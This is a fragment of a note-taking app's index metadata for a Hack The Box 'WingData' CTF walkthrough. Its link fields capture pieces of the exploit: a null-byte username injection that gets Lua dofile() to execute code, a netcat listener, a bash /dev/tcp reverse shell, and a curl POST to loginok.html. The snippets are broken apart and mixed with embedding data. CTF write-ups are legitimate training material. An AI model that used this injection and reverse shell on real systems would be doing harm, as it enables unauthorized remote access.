#{1}":[561,609],"#HTB WingData — CTF Walkthrough & Theory Notes#Related Topics":[610,618],"#HTB WingData — CTF Walkthrough & Theory Notes#Related Topics#{1}":[613,613],"#HTB WingData — CTF Walkthrough & Theory Notes#Related Topics#{2}":[614,614],"#HTB WingData — CTF Walkthrough & Theory Notes#Related Topics#{3}":[615,615],"#HTB WingData — CTF Walkthrough & Theory Notes#Related Topics#{4}":[616,616],"#HTB WingData — CTF Walkthrough & Theory Notes#Related Topics#{5}":[617,618]},"outlinks":[{"title":"\n                │\n                ▼\nC Validator:  reads \"admin\" then stops at \\0 → PASSES validation\n                │\n                ▼  \nFile Write:   writes entire raw buffer to disk → admin\\0\"","target":"│\n                ▼\nC Validator:  reads \"admin\" then stops at \\0 → PASSES validation\n                │\n                ▼  \nFile Write:   writes entire raw buffer to disk → admin\\0\"","line":174},{"title":"\n                │\n                ▼\nLua dofile(): ignores \\0, reads full content → executes os.execute('id')\n```\n\n**Visual Attack Flow:**\n\n```\nStep 1 — Attacker POSTs crafted username to /loginok.html\n          username = admin%00\"","target":"│\n                ▼\nLua dofile(): ignores \\0, reads full content → executes os.execute('id')\n```\n\n**Visual Attack Flow:**\n\n```\nStep 1 — Attacker POSTs crafted username to /loginok.html\n          username = admin\u0000\"","line":180},{"title":"Flag|Meaning|\n|---|---|\n|`-l`|Listen mode — wait for incoming connection|\n|`-v`|Verbose — display connection info|\n|`-n`|No DNS resolution — faster, avoids leaking queries|\n|`-p 4444`|Bind to port 4444|\n\n---\n\n### C.2 — Get Your VPN IP\n\n```bash\nip a show tun0\n```\n\nThe `tun0` interface is your HTB VPN address. This is the IP the target machine will connect back to.\n\n---\n\n### C.3 — Craft the Malicious Login Request\n\n**Payload structure (username field):**\n\n```\nadmin%00\"","target":"Step 2 — C-layer validation: sees \"admin\", passes ✓\n\nStep 3 — Session file written to disk with full malicious content\n\nStep 4 — Attacker requests session-linked page (dir.html) with session cookie\n\nStep 5 — Lua dofile() loads session file and EXECUTES injected code\n\nStep 6 — Reverse shell callback to attacker's nc listener\n```\n\n---\n\n### C.1 — Start Netcat Listener\n\n> Open a separate terminal before sending the exploit payload.\n\n```bash\nnc -lvnp 4444\n```","line":190},{"title":"Component|Role|\n|---|---|\n|`admin`|Valid username prefix — passes C-layer validation|\n|`%00`|URL-encoded null byte — terminates the C string|\n|`\"","target":"```\n\n**Payload component breakdown:**","line":237},{"title":"Opens a new Lua long string to swallow trailing syntax|\n|`bash -i >& /dev/tcp/IP/PORT 0>&1`|Bash reverse shell — redirects stdio over TCP|\n\n**Send via curl:**\n\n```bash\ncurl -s -X POST http://ftp.wingdata.htb/loginok.html \\\n  --data-urlencode 'username=admin%00\"","target":"`","line":248},{"title":"QA - Scanning Scenarios","target":"QA - Scanning Scenarios","line":613},{"title":"Phases of Ethical Hacking","target":"Phases of Ethical Hacking","line":614},{"title":"Nmap - Complete Guide","target":"Nmap - Complete Guide","line":615},{"title":"MOC - Tools","target":"MOC - Tools","line":616},{"title":"QA - Reconnaissance Scenarios","target":"QA - Reconnaissance Scenarios","line":617}],"task_lines":[],"tasks":{},"codeblock_ranges":[[12,30],[64,66],[75,77],[90,94],[119,121],[148,155],[159,161],[173,184],[188,201],[209,211],[224,226],[236,238],[253,257],[263,266],[276,280],[284,289],[306,309],[317,321],[325,328],[339,341],[355,360],[364,367],[376,379],[413,415],[419,421],[432,434],[438,440],[479,481],[492,500],[508,511],[519,522],[531,533],[535,540],[561,602]],"last_embed":{"hash":"1cubh7y","at":1773506210783}},"smart_blocks:12-HTB-Writeups/WingData.md#HTB WingData — CTF Walkthrough & Theory Notes": {"path":null,"embeddings":{"TaylorAI/bge-micro-v2":{"vec":[-0.1040787,-0.00316479,-0.04344967,-0.058